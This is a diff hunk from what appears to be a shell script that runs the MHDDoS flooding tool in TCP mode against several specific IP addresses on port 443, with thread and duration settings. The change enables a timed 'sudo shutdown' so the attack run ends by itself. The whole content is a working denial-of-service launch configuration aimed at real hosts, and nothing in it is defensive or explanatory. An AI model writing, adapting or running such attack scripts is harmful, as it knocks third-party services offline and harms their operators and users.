@@ -7,4 +7,4 @@ python3 /home/ubuntu/mhddos/start.py tcp 185.79.118.2:443 300 6200 &
 python3 /home/ubuntu/mhddos/start.py tcp 185.178.208.163:443 300 6200 &
 #python3 /home/ubuntu/mhddos/start.py tcp 185.46.11.253:443 100 6200 &
 
-#sudo shutdown -P +62&
+sudo shutdown -P +122 &
